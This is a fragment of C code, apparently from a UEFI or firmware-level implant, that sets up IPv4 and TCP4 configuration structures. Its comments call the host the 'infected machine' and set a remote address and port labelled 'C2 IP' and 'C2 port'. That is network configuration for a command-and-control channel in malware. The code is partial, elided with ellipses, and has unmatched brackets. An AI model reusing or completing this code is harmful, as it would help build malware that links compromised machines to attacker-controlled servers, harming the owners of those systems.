  ...
  )
{
  ...
  Ipv4Node.LocalAddress.Addr[0] = 192 ;   // Default Gateway IP (ex 192)
  Ipv4Node.LocalAddress.Addr[1] = 168 ;   // Default Gateway IP (ex 168)
  Ipv4Node.LocalAddress.Addr[2] = 0 ;   // Default Gateway IP
  Ipv4Node.LocalAddress.Addr[3] = 50 ;     // Default Gateway IP
  Ipv4Node.LocalSubnet.Addr[0]  = 255 ;   // Subnet Mask
  Ipv4Node.LocalSubnet.Addr[1]  =255 ;   // Subnet Mask
  Ipv4Node.LocalSubnet.Addr[2]  =255 ;   // Subnet Mask
  Ipv4Node.LocalSubnet.Addr[3]  =0 ;     // Subnet Mask
  Ipv4Node.LocalPort            = 0;  // Port to use for sender (NIC of infected machine)
  ...
  )
{
  ...
  Tcp4Ap.StationAddress.Addr[0] = 192 ;   // This IP (ex 192)
  Tcp4Ap.StationAddress.Addr[1] = 168 ;   // This IP (ex 168)
  Tcp4Ap.StationAddress.Addr[2] = 0 ;   // This IP
  Tcp4Ap.StationAddress.Addr[3] = 50 ;   // This IP
  Tcp4Ap.SubnetMask.Addr[0]     = 255;   // Subnet Mask
  Tcp4Ap.SubnetMask.Addr[1]     =255 ;   // Subnet Mask
  Tcp4Ap.SubnetMask.Addr[2]     =255 ;   // Subnet Mask
  Tcp4Ap.SubnetMask.Addr[3]     =0 ;     // Subnet Mask
  Tcp4Ap.StationPort            =0 ;     // Port to use for sender (NIC of infected machine)
  Tcp4Ap.RemoteAddress.Addr[0]  =192 ;   // C2 IP
  Tcp4Ap.RemoteAddress.Addr[1]  =168 ;   // C2 IP
  Tcp4Ap.RemoteAddress.Addr[2]  =0 ;   // C2 IP
  Tcp4Ap.RemoteAddress.Addr[3]  =40 ;   // C2 IP
  Tcp4Ap.RemotePort             =0 ;  // C2 port
